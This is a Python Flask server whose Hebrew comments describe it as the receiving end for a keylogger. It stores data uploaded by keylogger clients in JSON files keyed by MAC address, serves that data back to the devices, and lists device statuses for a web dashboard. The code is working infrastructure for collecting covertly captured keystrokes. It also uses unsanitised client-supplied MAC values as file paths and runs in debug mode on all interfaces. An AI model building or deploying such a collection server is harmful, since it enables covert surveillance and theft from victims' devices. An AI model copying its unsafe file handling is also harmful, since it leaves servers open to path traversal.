from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os

app = Flask(__name__)
CORS(app)  # מאפשר בקשות מכל דומיין

def write_to_json(filename, data):
    """ פונקציה לשמירת נתונים בקובץ JSON """
    try:
        file_path = f"{filename}.json"
        
        # אם הקובץ קיים, טוענים את הנתונים הקיימים, אחרת יוצרים מילון ריק
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as file:
                    existing_data = json.load(file)
            except json.JSONDecodeError:
                existing_data = {}  # במקרה של קובץ פגום, אתחול המידע
        else:
            existing_data = {}

        # עדכון הנתונים החדשים
        existing_data.update(data)
        
        # כתיבה חזרה לקובץ JSON
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(existing_data, f, ensure_ascii=False, indent=4)
        
        print(f"✅ נתונים נשמרו בהצלחה בקובץ {filename}.json")
    except Exception as e:
        print(f"❌ שגיאה בשמירת נתונים בקובץ {filename}.json: {e}")

@app.route('/api/status/update', methods=['POST'])
def status_update():
    """ מסלול לקבלת עדכון סטטוס מהקיי-לוגר """
    print("🔵 בקשת POST התקבלה מהקיי-לוגר - /api/status/update")
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        write_to_json("device_status", data)
        print("📥 נתונים שהתקבלו מהקיי-לוגר:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בטיפול בבקשה /api/status/update:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/data/upload', methods=['POST'])
def upload_data():
    """ מסלול להעלאת נתונים מהקיי-לוגר """
    print("🔵 בקשת POST התקבלה מהקיי-לוגר - /api/data/upload")
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = data.get("Mac-Address")
        if not mac_address:
            return jsonify({"error": "Missing macAddress"}), 400

        write_to_json(mac_address, data)
        print("📥 נתונים שהתקבלו מהקיי-לוגר:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בבקשה /api/data/upload:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/data/files', methods=['GET'])
def get_data():
    """ מסלול לשליפת נתונים מהשרת עבור הקיי-לוגר לפי כתובת MAC """
    print("🔵 בקשת GET התקבלה מהקיי-לוגר - /api/data/files")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400
    
    try:
        with open(f"{mac_address}.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print("📤 נתונים שנשלחו לקיי-לוגר:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify({"error": f"No data found for MAC: {mac_address}"}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500

@app.route('/api/status/all', methods=['GET'])
def get_status_all():
    """ מסלול לשליפת כל הסטטוסים של המכשירים עבור דף האינטרנט """
    print("🔵 בקשת GET התקבלה מהאתר - /api/status/all")
    try:
        with open("device_status.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print("📤 נתונים שנשלחו לאתר:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify({"error": "No data found"}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 השרת מופעל על פורט {port}")
    app.run(host="0.0.0.0", port=port, debug=True)
